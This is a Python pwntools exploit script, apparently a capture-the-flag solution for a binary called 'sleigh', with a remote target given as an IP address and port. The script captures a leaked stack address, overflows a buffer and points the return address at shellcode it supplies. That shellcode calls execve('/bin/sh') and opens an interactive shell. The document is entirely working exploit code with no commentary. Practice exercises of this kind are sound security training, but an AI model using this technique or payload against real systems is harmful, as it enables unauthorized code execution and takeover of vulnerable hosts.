import pwn
elf = pwn.context.binary = pwn.ELF("sleigh")
if pwn.args.REMOTE:
    p = pwn.remote("178.128.35.132", 30080)
elif pwn.args.GDB:
    p = pwn.gdb.debug("./sleigh", gdbscript="c\n")
else:
    p = elf.process()
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b": [")
leak = p.recvuntil(b"]", drop=True)
leak = int(leak, 16)
print("Stack Leak: ", hex(leak))
payload = b'A'*0x48
payload += pwn.p64(leak+0x50)
shellcode = pwn.asm('''
    mov rax,59
    lea rdi,[rip+binsh]
    mov rsi,0
    mov rdx,0
    syscall
binsh:
    .string "/bin/sh"
''', arch='amd64', os='linux')
payload += shellcode
p.sendline(payload)
p.interactive()
